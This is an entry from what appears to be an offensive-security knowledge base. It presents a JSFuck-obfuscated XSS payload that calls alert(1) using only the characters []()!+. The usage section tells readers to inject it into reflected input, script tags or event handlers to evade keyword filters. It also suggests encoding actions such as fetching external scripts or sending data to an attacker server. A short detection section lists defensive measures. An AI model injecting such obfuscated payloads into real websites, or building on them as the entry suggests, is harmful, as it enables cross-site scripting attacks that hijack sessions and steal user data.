---
type: code
language: JavaScript
verified: true
tags:
  - jsfuck
  - xss-payload
  - obfuscation
platforms:
  - Web
  - Browser
validated: true
---

# JSFuck-Alert-One-Payload

## Code

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

## Description

This JSFuck-encoded payload executes alert(1) in the browser, popping an alert box with the number 1. It uses only the characters []()!+ to construct the alert function call, making it ideal for bypassing filters that scan for JavaScript keywords. This is a classic example payload for testing XSS obfuscation techniques.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload with no variables; customize by encoding different JS actions. | N/A |

## Usage

Inject this code into an XSS vector, such as within a <script> tag, event handler (e.g., onerror), or directly in reflected input. Test in the browser console first: paste and execute to verify it triggers the alert. In a real attack, encode more complex actions like fetching external scripts or sending data to an attacker server.

Used in procedures like [[procedures/JSFuck-Obfuscation-for-XSS-Payloads]] for filter evasion.

## Detection

- Analyze for unusual character patterns in inputs (repetitive []()!+ sequences).
- Browser security tools like CSP or extensions (e.g., NoScript) can block dynamic script execution.
- Log and inspect decoded JavaScript in WAFs; signature-based detection for known JSFuck patterns.
- Monitor for alert() calls or unexpected popups in client-side logs.
